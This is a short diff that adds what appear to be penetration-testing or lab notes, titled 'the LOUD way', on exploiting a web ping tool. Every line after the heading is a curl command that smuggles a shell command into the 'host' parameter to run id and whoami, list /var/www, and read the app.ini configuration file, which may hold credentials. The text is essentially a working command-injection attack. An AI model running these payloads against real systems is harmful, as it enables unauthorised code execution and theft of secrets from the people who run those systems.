@@ -1,0 +1,6 @@
+## the LOUD way: poke the injection again and again to look around
+curl -s 'http://10.10.5.30/tools/ping?host=127.0.0.1;id'
+curl -s 'http://10.10.5.30/tools/ping?host=x;whoami'
+curl -s 'http://10.10.5.30/tools/ping?host=x;ls -la /var/www'
+curl -s 'http://10.10.5.30/tools/ping?host=x;ls -la /var/www/conf'
+curl -s 'http://10.10.5.30/tools/ping?host=x;cat /var/www/conf/app.ini'
